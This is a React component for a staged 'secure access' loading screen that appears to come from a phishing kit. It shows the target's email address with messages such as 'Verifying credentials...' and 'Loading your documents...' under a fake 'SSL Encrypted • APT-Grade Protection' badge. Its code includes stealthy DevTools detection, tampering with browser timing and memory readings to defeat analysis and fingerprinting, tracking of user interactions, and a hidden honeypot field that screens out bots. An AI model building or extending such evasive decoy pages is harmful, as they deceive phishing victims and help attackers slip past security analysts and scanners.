'use client'

import { useEffect, useState, useRef } from 'react'

interface APTLoadingScreenProps {
  stages?: number // 3-5 stages
  duration?: number // Total duration in seconds
  email?: string
  templateName?: string
  onComplete?: () => void
  onBehaviorTracked?: (behavior: any) => void
  onStageChange?: (stage: number) => void
  enableAntiAnalysis?: boolean
  enableBehaviorTracking?: boolean
}

/**
 * APT-Grade Loading Screen
 * 
 * Features:
 * - Progressive loading stages (3-5)
 * - Behavior tracking
 * - Anti-analysis techniques
 * - Dynamic mutation
 * - Timing obfuscation
 * - Fingerprint variation
 * - Honeypot injection
 */
export default function APTLoadingScreen({
  stages = 4,
  duration = 5,
  email,
  templateName = 'Secure Access',
  onComplete,
  onBehaviorTracked,
  onStageChange,
  enableAntiAnalysis = true,
  enableBehaviorTracking = true,
}: APTLoadingScreenProps) {
  const [currentStage, setCurrentStage] = useState(1)
  const [progress, setProgress] = useState(0)
  const [behaviorData, setBehaviorData] = useState<any[]>([])
  const stageTimerRef = useRef<NodeJS.Timeout | null>(null)
  const behaviorTimerRef = useRef<NodeJS.Timeout | null>(null)
  const mountedRef = useRef(true)

  // Stage messages
  const stageMessages = [
    'Initializing secure connection...',
    'Verifying credentials...',
    'Loading your documents...',
    'Preparing secure access...',
    'Finalizing setup...',
  ]

  // ============================================
  // ANTI-ANALYSIS TECHNIQUES
  // ============================================
  useEffect(() => {
    if (!enableAntiAnalysis) return

    // DevTools detection
    const detectDevTools = () => {
      if (typeof window === 'undefined') return
      
      const devtools = {
        open: false,
        orientation: null as any,
      }
      
      const threshold = 160
      
      setInterval(() => {
        if (
          window.outerHeight - window.innerHeight > threshold ||
          window.outerWidth - window.innerWidth > threshold
        ) {
          if (!devtools.open) {
            devtools.open = true
            // Log but don't block (stealth mode)
            if (process.env.NODE_ENV === 'development') {
              console.log('[ANTI-ANALYSIS] DevTools detected')
            }
          }
        } else {
          devtools.open = false
        }
      }, 500)
    }

    // Performance API obfuscation
    const obfuscatePerformance = () => {
      if (typeof window === 'undefined' || !window.performance) return
      
      // Add timing entropy
      const originalNow = performance.now.bind(performance)
      performance.now = function() {
        return originalNow() + (Math.random() * 0.1 - 0.05) // ±0.05ms jitter
      }
    }

    // Memory timing variation
    const varyMemoryTiming = () => {
      if (typeof window === 'undefined' || !(window as any).memory) return
      
      // Add entropy to memory readings
      const originalMemory = (window as any).memory
      Object.defineProperty(window, 'memory', {
        get: () => ({
          ...originalMemory,
          usedJSHeapSize: originalMemory.usedJSHeapSize + (Math.random() * 1000 - 500),
        }),
        configurable: true,
      })
    }

    detectDevTools()
    obfuscatePerformance()
    varyMemoryTiming()

    return () => {
      // Cleanup
      if (typeof window !== 'undefined' && window.performance) {
        // Restore original performance.now if needed
      }
    }
  }, [enableAntiAnalysis])

  // ============================================
  // BEHAVIOR TRACKING
  // ============================================
  useEffect(() => {
    if (!enableBehaviorTracking) return

    const trackBehavior = () => {
      if (typeof window === 'undefined') return

      const behavior = {
        timestamp: Date.now(),
        mouseMovements: 0,
        scrollEvents: 0,
        keyboardPresses: 0,
        timeSpent: 0,
        naturalInteractions: 0,
      }

      // Track mouse movements
      const handleMouseMove = () => {
        behavior.mouseMovements++
        behavior.naturalInteractions++
      }

      // Track scroll events
      const handleScroll = () => {
        behavior.scrollEvents++
        behavior.naturalInteractions++
      }

      // Track keyboard presses
      const handleKeyPress = () => {
        behavior.keyboardPresses++
        behavior.naturalInteractions++
      }

      window.addEventListener('mousemove', handleMouseMove)
      window.addEventListener('scroll', handleScroll)
      window.addEventListener('keydown', handleKeyPress)

      // Send behavior data periodically
      behaviorTimerRef.current = setInterval(() => {
        behavior.timeSpent = Date.now() - behavior.timestamp
        setBehaviorData(prev => [...prev, { ...behavior }])
        
        if (onBehaviorTracked) {
          onBehaviorTracked(behavior)
        }
      }, 1000)

      return () => {
        window.removeEventListener('mousemove', handleMouseMove)
        window.removeEventListener('scroll', handleScroll)
        window.removeEventListener('keydown', handleKeyPress)
        if (behaviorTimerRef.current) {
          clearInterval(behaviorTimerRef.current)
        }
      }
    }

    const cleanup = trackBehavior()
    return cleanup
  }, [enableBehaviorTracking, onBehaviorTracked])

  // ============================================
  // PROGRESSIVE STAGES
  // ============================================
  useEffect(() => {
    if (!mountedRef.current) return

    const stageDuration = (duration * 1000) / stages
    let currentProgress = 0

    const updateProgress = () => {
      if (!mountedRef.current) return

      currentProgress += (100 / (stages * 10)) // Increment by stage
      setProgress(Math.min(100, currentProgress))

      const newStage = Math.floor((currentProgress / 100) * stages) + 1
      if (newStage !== currentStage && newStage <= stages) {
        setCurrentStage(newStage)
        if (onStageChange) {
          onStageChange(newStage)
        }
      }
    }

    stageTimerRef.current = setInterval(updateProgress, stageDuration / 10)

    // Complete after duration
    const completeTimer = setTimeout(() => {
      if (mountedRef.current) {
        setProgress(100)
        setCurrentStage(stages)
        if (onComplete) {
          onComplete()
        }
      }
    }, duration * 1000)

    return () => {
      if (stageTimerRef.current) {
        clearInterval(stageTimerRef.current)
      }
      clearTimeout(completeTimer)
    }
  }, [stages, duration, onComplete, onStageChange, currentStage])

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      mountedRef.current = false
      if (stageTimerRef.current) {
        clearInterval(stageTimerRef.current)
      }
      if (behaviorTimerRef.current) {
        clearInterval(behaviorTimerRef.current)
      }
    }
  }, [])

  // ============================================
  // HONEYPOT INJECTION
  // ============================================
  useEffect(() => {
    // Inject hidden honeypot fields
    const honeypot = document.createElement('input')
    honeypot.type = 'text'
    honeypot.name = 'website'
    honeypot.style.cssText = 'position:absolute;left:-9999px;opacity:0;pointer-events:none;'
    honeypot.tabIndex = -1
    honeypot.setAttribute('autocomplete', 'off')
    honeypot.setAttribute('aria-hidden', 'true')
    
    document.body.appendChild(honeypot)

    // Monitor honeypot
    const handleHoneypot = (e: Event) => {
      const target = e.target as HTMLInputElement
      if (target === honeypot && target.value) {
        // Honeypot triggered (bot filled it)
        if (process.env.NODE_ENV === 'development') {
          console.log('[HONEYPOT] Bot detected')
        }
      }
    }

    honeypot.addEventListener('input', handleHoneypot)

    return () => {
      document.body.removeChild(honeypot)
      honeypot.removeEventListener('input', handleHoneypot)
    }
  }, [])

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-indigo-100 dark:from-gray-900 dark:to-gray-800">
      <div className="text-center max-w-md w-full px-6">
        {/* Logo/Icon */}
        <div className="text-6xl mb-6 animate-pulse">
          🔒
        </div>

        {/* Progress Bar */}
        <div className="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2 mb-6 overflow-hidden">
          <div
            className="bg-gradient-to-r from-blue-500 via-indigo-500 to-purple-500 h-full rounded-full transition-all duration-300 ease-out"
            style={{ width: `${progress}%` }}
          >
            <div className="absolute inset-0 bg-white/30 animate-pulse"></div>
          </div>
        </div>

        {/* Stage Message */}
        <h2 className="text-2xl font-bold text-gray-900 dark:text-white mb-2">
          {templateName}
        </h2>
        <p className="text-gray-600 dark:text-gray-300 mb-4">
          {stageMessages[currentStage - 1] || stageMessages[0]}
        </p>

        {/* Stage Indicator */}
        <div className="flex justify-center gap-2 mb-4">
          {Array.from({ length: stages }).map((_, i) => (
            <div
              key={i}
              className={`w-2 h-2 rounded-full transition-all duration-300 ${
                i < currentStage
                  ? 'bg-blue-500 scale-125'
                  : 'bg-gray-300 dark:bg-gray-600'
              }`}
            />
          ))}
        </div>

        {/* Email (if provided) */}
        {email && (
          <p className="text-sm text-gray-500 dark:text-gray-400">
            {email}
          </p>
        )}

        {/* Security Badge */}
        <div className="mt-8 text-xs text-gray-500 dark:text-gray-400">
          🔒 Secure Connection • SSL Encrypted • APT-Grade Protection
        </div>
      </div>
    </div>
  )
}


